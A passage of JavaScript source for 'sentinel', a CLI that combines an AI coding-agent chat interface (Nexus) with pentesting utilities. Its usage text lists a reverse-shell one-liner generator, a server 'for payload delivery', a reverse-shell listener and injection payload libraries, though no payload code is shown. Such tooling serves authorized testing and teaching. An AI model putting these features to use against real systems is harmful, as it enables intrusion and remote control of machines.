        if (sub === "save" && name && body) { snippets[name] = body; saveSnippets(); transcript.push({ role: "system", text: "saved snippet '" + name + "' — use it with /snippet " + name + " (or /snip)" }); }
        else if ((sub === "del" || sub === "rm") && name) { if (snippets[name]) { delete snippets[name]; saveSnippets(); transcript.push({ role: "system", text: "deleted snippet '" + name + "'" }); } else transcript.push({ role: "system", text: "no snippet '" + name + "'" }); }
        else if (sub && snippets[sub]) { const rest = argstr.split(/\s+/).slice(1).join(" "); submit(snippets[sub].replace(/\$ARGUMENTS/g, rest).replace(/\$(\d+)/g, (_, n) => rest.split(/\s+/)[+n - 1] || "")); }
        else transcript.push({ role: "system", text: "usage:  /snippet save <name> <text…>   ·   /snippet <name> [args]   ·   /snippet del <name>   ·   /snippets to list" }); }
      else if (cmd === "/snippets") { const ks = Object.keys(snippets); transcript.push({ role: "system", text: ks.length ? ("saved snippets:\n" + ks.map((k) => "  " + k + "  " + gray(oneline(snippets[k], 50))).join("\n")) : "no snippets yet — /snippet save <name> <text>" }); }
      else if (cmd === "/explain") { if (arg) submit("Explain, in plain English, what @" + arg + " does and how it works. Do not modify anything."); else { let d = ""; try { d = _cp.execSync("git -c color.ui=never diff HEAD", { cwd, encoding: "utf8" }); } catch (_) {} if (!d.trim()) transcript.push({ role: "system", text: "no uncommitted changes to explain — try /explain <file>" }); else submit("Explain, in plain English, what these uncommitted changes do (do not modify anything):\n\n" + d.slice(0, 8000)); } }
      else if (cmd === "/test") { if (!arg) transcript.push({ role: "system", text: "usage: /test <file> — generate thorough unit tests for it and run them" }); else submit("Write thorough unit tests for @" + arg + ", save them in this project's conventional test location/framework, then run the tests."); }
      else if (cmd === "/tree") { const root = path.resolve(cwd, arg || "."); const out = { lines: [], count: 0 }; const walk = (dir, prefix, depth) => { if (depth > 4 || out.count > 250) return; let ents; try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch (_) { return; } ents = ents.filter((e) => !/^(\.git|node_modules|\.nexus|dist|build|\.cache|\.next|target|__pycache__)$/.test(e.name)).sort((a, b) => (b.isDirectory() - a.isDirectory()) || a.name.localeCompare(b.name)); ents.forEach((e, i) => { if (out.count > 250) return; const last = i === ents.length - 1; out.lines.push(prefix + (last ? "└─ " : "├─ ") + e.name + (e.isDirectory() ? "/" : "")); out.count++; if (e.isDirectory()) walk(path.join(dir, e.name), prefix + (last ? "   " : "│  "), depth + 1); }); }; walk(root, "", 0); transcript.push({ role: "system", text: (arg || ".") + "/\n" + (out.lines.join("\n") || "(empty)") + (out.count > 250 ? "\n… (truncated at 250 entries)" : "") }); }
      else if (cmd === "/theme") { if (arg && THEMES[arg]) { GRAD = THEMES[arg]; transcript.push({ role: "system", text: "theme set to " + arg + " — the logo & boot gradient now use it" }); } else transcript.push({ role: "system", text: "themes:  " + Object.keys(THEMES).join("  ·  ") + "\nuse /theme <name>" }); }
      else if (cmd === "/offline") { offline = !offline; if (offline && PAID[engine]) { engine = "ollama"; sess.model = "ollama"; sess.ctxWindow = CTXW.ollama || 8192; sess.inTok = 0; sess.outTok = 0; sess.cost = 0; sess.ctxUsed = 0; cont = false; oMsgs.length = 1; transcript.push({ role: "system", text: "offline lock ON — switched to the local engine; cloud engines (claude/opencode) are blocked and nothing leaves this machine" }); } else transcript.push({ role: "system", text: offline ? "offline lock ON — cloud engines blocked; nothing leaves this machine" : "offline lock off — cloud engines allowed again" }); }
      else if (cmd === "/checkpoints") { transcript.push({ role: "system", text: checkpoints.length ? ("checkpoints (newest last):\n" + checkpoints.map((c, i) => "  #" + (i + 1) + "  " + c.label).join("\n") + "\n/undo restores the most recent") : "no checkpoints yet" }); }
      else if (cmd === "/init") { try { const dir = path.join(cwd, ".nexus"); fs.mkdirSync(dir, { recursive: true }); const md = path.join(dir, "NEXUS.md"), cfg = path.join(dir, "config.json"); const made = []; if (!fs.existsSync(md)) { fs.writeFileSync(md, "# Nexus project instructions\n\nNexus loads this file every session.\n\n## Project\n- (describe your project)\n\n## Conventions\n- (style, patterns to follow)\n\n## Build / run / test\n- (commands)\n"); made.push("NEXUS.md"); } if (!fs.existsSync(cfg)) { fs.writeFileSync(cfg, JSON.stringify({ engine, model: "" }, null, 2) + "\n"); made.push("config.json"); } if (gitignoreNexus(cwd)) made.push(".gitignore"); transcript.push({ role: "system", text: made.length ? "initialized .nexus/ (" + made.join(", ") + ") — edit NEXUS.md to give Nexus project context" : ".nexus/ already exists" }); } catch (e) { transcript.push({ role: "system", text: "init failed: " + e.message }); } }
      else if (cmd === "/model") { if (arg) { sess.model = arg; transcript.push({ role: "system", text: "model set to " + arg + (engine !== "ollama" ? " (note: the claude/opencode engines choose their own model)" : "") }); } else transcript.push({ role: "system", text: "current model: " + (sess.model || engine) }); }
      else if (cmd === "/expand") expanded = !expanded;
      else if (cmd === "/engine") { if (offline && (arg === "claude" || arg === "opencode")) { transcript.push({ role: "system", text: "offline lock is ON — cloud engines are blocked. Turn it off with /offline first." }); } else if (["claude", "opencode", "ollama"].includes(arg)) { engine = arg; sess.model = arg; sess.ctxWindow = CTXW[arg] || 200000; sess.inTok = 0; sess.outTok = 0; sess.cost = 0; sess.ctxUsed = 0; warned50 = false; cont = false; oMsgs.length = 1; transcript.push({ role: "system", text: "engine switched to " + arg + " — the cost meter now tracks " + (PAID[arg] ? arg + " (billed)" : arg + " (local · free)") + "; fresh conversation" }); } else transcript.push({ role: "system", text: "usage: /engine claude|opencode|ollama" }); }
      else transcript.push({ role: "system", text: "unknown command '" + cmd + "' — try /help" });
    };
    // ---- input / keys ----
    out.write(ESC + "[?1049h" + ESC + "[?1000h" + ESC + "[?1006h" + ESC + "[?2004h" + ESC + "[?25l" + ESC + "[2J");
    try { process.stdin.setRawMode(true); } catch (_) {}
    process.stdin.resume(); process.stdin.setEncoding("utf8");
    let loading = true;
    // auto-connect MCP servers defined in .nexus/mcp.json (non-blocking)
    const connectMcp = async () => { const cfg = loadMcpConfig(cwd); if (!cfg) return; for (const nm of Object.keys(cfg)) { const c = await mcpConnect(nm, cfg[nm], cwd); mcpServers.push(c); if (!loading) render(); } };
    connectMcp();
    process.stdin.on("data", (d) => { try {
      if (loading) return;
      const s = String(d);
      if (s === "\x03") { if (busy && ctl && ctl.kill) { ctl.kill(); transcript.push({ role: "system", text: "interrupting current turn…" }); render(); return; } cleanup(); resolve(); return; } // ctrl+c: stop turn if running, else quit
      if (s === "\x1b[Z") { mode = (mode + 1) % MODES.length; render(); return; } // shift+tab
      if (s === "\x0f") { expanded = !expanded; render(); return; }      // ctrl+o
      // ---- scrollback (works during a turn too) ----
      const page = Math.max(1, rows() - 6);
      if (s === "\x1b[5~") { scroll += page; render(); return; }         // PageUp
      if (s === "\x1b[6~") { scroll = Math.max(0, scroll - page); render(); return; } // PageDown
      if (s === "\x1b[F" || s === "\x1b[4~" || s === "\x1bOF") { scroll = 0; render(); return; } // End -> latest
      if (s === "\x1b[1~" || s === "\x1bOH" || s === "\x1b[H") { scroll += 100000; render(); return; } // Home -> top (clamped in render)
      if (s.charCodeAt(0) === 27 && s[1] === "[" && s[2] === "<") { const m = /\[<(\d+);\d+;\d+[Mm]/.exec(s); if (m) { const btn = +m[1]; if (btn === 64) { scroll += 3; render(); } else if (btn === 65) { scroll = Math.max(0, scroll - 3); render(); } } return; } // SGR mouse wheel
      if (busy) return;                                                  // ignore typing mid-turn (scroll/interrupt/mode still work above)
      // ---- bracketed paste (handles multi-line pastes, possibly split across chunks) ----
      if (pasteBuf !== null || s.indexOf("\x1b[200~") !== -1) {
        let chunk = s;
        if (pasteBuf === null) { pasteBuf = ""; chunk = chunk.slice(chunk.indexOf("\x1b[200~") + 6); }
        const end = chunk.indexOf("\x1b[201~");
        if (end === -1) { pasteBuf += chunk; return; }                   // more paste coming in a later chunk
        pasteBuf += chunk.slice(0, end);
        input += pasteBuf.replace(/\r\n?|\n/g, " ").replace(/[^\x20-\x7e]+/g, "");
        pasteBuf = null; render(); return;
      }
      if (s === "\x1b[A") { if (history.length) { hIdx = Math.max(0, hIdx - 1); input = history[hIdx] || ""; render(); } return; } // up
      if (s === "\x1b[B") { if (history.length) { hIdx = Math.min(history.length, hIdx + 1); input = history[hIdx] || ""; render(); } return; } // down
      if (s.charCodeAt(0) === 27) return;                                // other escapes
      for (const ch of s) {
        if (ch === "\t") { // Tab completes a slash command, else an @file path
          const mm = slashMatches(); if (mm.length) { input = mm[0][0] + " "; render(); return; }
          const at = input.match(/@([^\s]*)$/);
          if (at) { try { const pt = at[1]; const dir = pt.includes("/") ? pt.slice(0, pt.lastIndexOf("/") + 1) : ""; const bpart = pt.includes("/") ? pt.slice(pt.lastIndexOf("/") + 1) : pt; const entries = fs.readdirSync(path.resolve(cwd, dir || ".")).filter((e) => e.startsWith(bpart)).sort(); if (entries.length) { const hit = entries[0]; const isDir = fs.statSync(path.resolve(cwd, dir + hit)).isDirectory(); input = input.slice(0, at.index) + "@" + dir + hit + (isDir ? "/" : " "); } } catch (_) {} render(); }
          return;
        }
        if (ch === "\r" || ch === "\n") {
          if (input.endsWith("\\")) { input = input.slice(0, -1) + "\n"; render(); return; } // trailing backslash = newline, not submit
          const t = input.trim(); input = ""; if (/^\/(exit|quit|q)$/i.test(t)) { cleanup(); resolve(); return; } if (t.startsWith("/")) { let cmd = t; if (!/\s/.test(t)) { const mm = allCmds().filter((c) => c[0].startsWith(t.toLowerCase())); if (mm.length && !mm.some((c) => c[0] === t.toLowerCase())) cmd = mm[0][0]; } handleSlash(cmd); render(); return; } if (t[0] === "!" && t.length > 1) { runBang(t.slice(1).trim()); render(); return; } if (t[0] === "#" && t.length > 1) { addMemory(t.slice(1).trim()); render(); return; } if (t) { submit(t); return; } render(); }
        else if (ch === "\x7f" || ch === "\b") { input = input.slice(0, -1); render(); }
        else if (ch >= " ") { input += ch; render(); }
      }
    } catch (err) { busy = false; try { transcript.push({ role: "system", text: "internal error: " + (err && err.message || err) }); render(); } catch (_) {} } });
    out.on("resize", onResize);
    // ---- boot loading animation ----
    (function boot() {
      const bspin = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"], word = "N E X U S", pool = "01<>[]{}#@$%&*/\\=+ABCDEF";
      const steps = ["linking " + engine + " engine", "loading tools", "priming context", "ready"];
      const grad = GRAD;
      const gtitle = (s) => useColor ? s.split("").map((ch, i) => "\x1b[1;" + grad[i % grad.length] + "m" + ch).join("") + "\x1b[0m" : s;
      let f = 0; const total = 24;
      const t = setInterval(() => {
        const C = cols(), R = rows(), cx = (C / 2) | 0, cy = (R / 2) | 0;
        let title = ""; for (let k = 0; k < word.length; k++) title += (word[k] === " " || k < (f / total) * word.length) ? word[k] : pool[(Math.random() * pool.length) | 0];
        const done = f >= total;
        const bar = Math.round((f / total) * 22);
        const put = (row, str, vis) => ESC + "[" + row + ";" + Math.max(1, cx - (((vis || str.length) / 2) | 0)) + "H" + str;
        let b = ESC + "[2J";
        b += put(cy - 2, cyan(bspin[f % bspin.length]) + "  " + (done ? gtitle(title) : bold(title)), word.length + 3);
        b += put(cy, dim(gray("A I   c o d i n g   a g e n t")), 25);
        b += put(cy + 2, gray("[") + cyan("█".repeat(bar)) + gray("░".repeat(22 - bar)) + gray("]"), 24);
        b += put(cy + 4, gray(steps[Math.min(steps.length - 1, ((f / total) * steps.length) | 0)] + "…"), 22);
        out.write(b);
        if (++f > total) { clearInterval(t); loading = false; out.write(ESC + "[2J"); render(); }
      }, 55);
    })();
  });
}
// add `.nexus/` to .gitignore (Nexus's state dir shouldn't clutter git); returns true if it added it
function gitignoreNexus(cwd) {
  try {
    const fs = require("fs"), path = require("path");
    if (!fs.existsSync(path.join(cwd, ".git"))) return false;
    const gi = path.join(cwd, ".gitignore");
    let cur = ""; try { cur = fs.readFileSync(gi, "utf8"); } catch (_) {}
    if (/(^|\n)\.nexus\/?(\r?\n|$)/.test(cur)) return false;
    fs.writeFileSync(gi, cur + (cur && !cur.endsWith("\n") ? "\n" : "") + ".nexus/\n");
    return true;
  } catch (_) { return false; }
}
function nexusInit() {
  const fs = require("fs"), path = require("path");
  const cwd = process.cwd(), NEXUS = path.join(cwd, ".nexus");
  gitignoreNexus(cwd);
  fs.mkdirSync(NEXUS, { recursive: true });
  const mdPath = path.join(NEXUS, "NEXUS.md"), cfgPath = path.join(NEXUS, "config.json");
  const detected = [];
  try { if (fs.existsSync("package.json")) { const p = JSON.parse(fs.readFileSync("package.json", "utf8")); detected.push("Node project" + (p.name ? " (" + p.name + ")" : "")); if (p.scripts) detected.push("npm scripts: " + Object.keys(p.scripts).slice(0, 8).join(", ")); } } catch (_) {}
  try { if (fs.existsSync("requirements.txt") || fs.existsSync("pyproject.toml") || fs.existsSync("setup.py")) detected.push("Python project"); } catch (_) {}
  try { if (fs.existsSync("Cargo.toml")) detected.push("Rust project"); } catch (_) {}
  try { if (fs.existsSync("go.mod")) detected.push("Go project"); } catch (_) {}
  try { if (fs.existsSync(".git")) detected.push("git repository"); } catch (_) {}
  let created = [];
  if (!fs.existsSync(mdPath)) { fs.writeFileSync(mdPath, "# Nexus project instructions\n\nNexus loads this file at the start of every session. Describe the project, conventions, and how to build/run/test it so the agent has context.\n\n## Project\n" + (detected.length ? detected.map((d) => "- " + d).join("\n") : "- (describe your project here)") + "\n\n## Conventions\n- (code style, patterns to follow, things to avoid)\n\n## Build / run / test\n- (commands to build, run, and test)\n"); created.push("NEXUS.md"); }
  if (!fs.existsSync(cfgPath)) { fs.writeFileSync(cfgPath, JSON.stringify({ engine: hasBin("claude") ? "claude" : "ollama", model: process.env.SENTINEL_MODEL || "" }, null, 2) + "\n"); created.push("config.json"); }
  banner(); h1("Nexus initialized");
  created.forEach((f) => console.log("  " + green("created ") + ".nexus/" + f));
  if (!created.length) console.log("  " + gray("already initialized (.nexus/ exists)"));
  if (detected.length) console.log("\n  " + gray("detected: ") + detected.join(gray(" · ")));
  console.log("\n  " + bold("Next steps"));
  console.log("    " + cyan("sentinel nexus") + gray("                 start a chat session"));
  console.log("    " + cyan("sentinel nexus run \"<goal>\"") + gray("     autonomous multi-step run"));
  console.log("    " + gray("edit ") + ".nexus/NEXUS.md" + gray(" to give the agent project context") + "\n");
}
function usage() {
  banner();
  console.log(`  ${bold("USAGE")}
    sentinel [command] [args]         no command opens the interactive menu

  ${bold("COMMANDS")}
    init                              scaffold Nexus in this project (.nexus/NEXUS.md + config)
    nexus [opts] [task]               Nexus AI coder chat: -e claude|ollama|opencode, -y skip prompts, --print headless
    nexus run "<goal>" [opts]         autonomous multi-level runner: -e engine, --overnight, --until, --resume
    scan <host> [ports]               TCP scan (ports: top | 1-1024 | 80,443)
    dns <domain>                      A / AAAA / MX / NS / TXT / CNAME + reverse
    whois <domain|ip>                 native WHOIS lookup
    headers <url>                     HTTP status + security-header check
    cert <host>                       TLS certificate inspector
    subs <domain>                     passive subdomain enum (crt.sh)
    cve <keyword | CVE-id>            search the NVD vulnerability database
    fuzz <url> [wordlist]             directory / content brute-forcer
    git clone <url>                   clone a repo (SENTINEL_GH_TOKEN for private)
    git push [message]                commit all changes + push
    git pull                          pull the latest changes
    git status                        working-tree status
    git log                           recent commits
    git diff [file]                   working-tree diff
    git branch                        list branches
    git checkout <branch>             switch branch
    git repos                         list your repositories
    git new <name>                    create a private repo
    git issues <owner/repo>           list open issues
    git prs <owner/repo>              list open pull requests
    git issue <owner/repo> "title"    create an issue
    git pr "title" [base]             open a PR from the current branch
    git comment <owner/repo> <n> "…"  comment on an issue/PR
    git gists                         list your gists
    git gist <file> [description]     create a gist from a file
    revshell <lang> <ip> <port>       reverse-shell one-liner
    encode <b64|hex|url> <text>       encode text
    decode <b64|hex|url> <text>       decode text
    hash <text>                       md5 / sha1 / sha256 / sha512
    hashid <hash>                     identify a hash type
    genpass [length]                  generate a strong random password (default 20)
    uuid                              generate a random UUID v4
    myip                              show your public IP address
    ipinfo <ip>                       geolocate an IP (city, ISP, ASN)
    status <code>                     look up an HTTP status code
    cidr <a.b.c.d/xx>                 subnet calculator (range, hosts, mask)
    jwt <token>                       decode a JWT header + payload
    dorks <domain>                    print Google dork search URLs for a domain
    hashfile <file>                   md5 / sha1 / sha256 / sha512 of a file
    serve [port] [dir]                HTTP file server for payload delivery (default 8000)
    listen [port]                     TCP listener to catch a reverse shell (default 4444)
    lab [target]                      practice targets (dvwa, juice, webgoat, bwapp, mutillidae)
    payloads [class]                  payload library (sqli, xss, lfi, cmdi, ssti, ssrf)
    cheats [topic]                    ${Object.keys(CHEATS).join(", ")}
    tools                             tool catalog + install commands
    setup <tool>                      auto-configure a tool on first use

  ${bold("OPTIONS")}
    -h, --help                        show this help
    -v, --version                     show version
    NO_COLOR=1                        disable colored output

  ${bold("EXAMPLES")}
    ${gray("$")} sentinel scan 10.10.14.7 top
    ${gray("$")} sentinel revshell bash 10.10.14.7 4444
    ${gray("$")} sentinel hash 'S3cr3t!'

  ${gray("MIT licensed · use only on systems you are authorized to test.")}
`);
}

// ---------- entry ----------
process.on("SIGINT", () => { if (tuiActive) return; console.log("\n  " + gray("interrupted — stay sharp.") + "\n"); process.exit(130); });
const args = process.argv.slice(2);
if (args[0] === "-v" || args[0] === "--version") { console.log("sentinel " + VERSION); process.exit(0); }
else if (args.length === 0) mainMenu();
else if (args[0] === "-h" || args[0] === "--help") usage();
else cli(args).then(() => process.exit(0)).catch((e) => { console.error("  " + red("error: " + e.message)); process.exit(1); });
